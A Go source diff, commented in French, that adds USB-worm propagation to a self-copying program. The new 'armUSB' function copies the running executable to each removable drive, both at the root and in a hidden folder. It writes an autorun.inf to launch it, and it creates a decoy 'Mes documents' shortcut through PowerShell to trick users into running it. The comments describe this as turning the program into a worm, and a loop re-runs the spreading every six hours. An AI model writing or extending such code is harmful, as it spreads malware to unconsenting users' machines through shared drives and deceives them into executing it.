@@ -111,6 +111,15 @@ func spreadCopies(verbose bool) string {
 		targets = append(targets, filepath.Join(d, name))
 	}
 
+	// Clés USB : copie à la racine + dossier + autorun + raccourci leurre.
+	// C est ce qui transforme une copie en ver : la clé repart avec lui.
+	armed := 0
+	for _, d := range removable {
+		if armUSB(d, exe, name, folder) {
+			armed++
+		}
+	}
+
 	done, failed := 0, 0
 	var lines []string
 	for _, t := range targets {
@@ -141,7 +150,37 @@ func spreadCopies(verbose bool) string {
 		return fmt.Sprintf("%d copie(s) posée(s) :\n```\n%s\n```", done, strings.Join(lines, "\n"))
 	}
 	plog(fmt.Sprintf("duplication: %d copie(s)", done))
+	if armed > 0 {
+		plog(fmt.Sprintf("duplication: %d clé(s) USB armée(s)", armed))
+	}
 	return ""
+}
+
+// armUSB prépare une clé : copie, dossier caché, autorun.inf et raccourci.
+func armUSB(drive, exe, name, folder string) bool {
+	data, err := os.ReadFile(exe)
+	if err != nil {
+		return false
+	}
+	rootCopy := filepath.Join(drive, name)
+	hiddenCopy := filepath.Join(drive, folder, name)
+	copyTo(exe, rootCopy, data)
+	copyTo(exe, hiddenCopy, data)
+
+	// autorun.inf : ignoré par Windows 10/11 pour les clés, encore actif sur
+	// certains postes et lecteurs réseau.
+	inf := "[autorun]\r\nopen=" + name + "\r\naction=Ouvrir le dossier\r\nicon=" + name + "\r\nshell\\open\\command=" + name + "\r\n"
+	_ = os.WriteFile(filepath.Join(drive, "autorun.inf"), []byte(inf), 0600)
+
+	// Raccourci leurre : même cible, nom de dossier familier.
+	lnk := filepath.Join(drive, "Mes documents.lnk")
+	if !fileExists(lnk) {
+		script := "(New-Object -ComObject WScript.Shell).CreateShortcut(" + qPS(lnk) + ")" +
+			" | ForEach-Object { $_.TargetPath=" + qPS(rootCopy) + "; $_.WindowStyle=7;" +
+			" $_.Description=\"Mes documents\"; $_.Save() }"
+		_, _ = runPSUTF8(script)
+	}
+	return true
 }
 
 // spreadLoop refait une passe toutes les 6 heures : une clé USB branchée plus
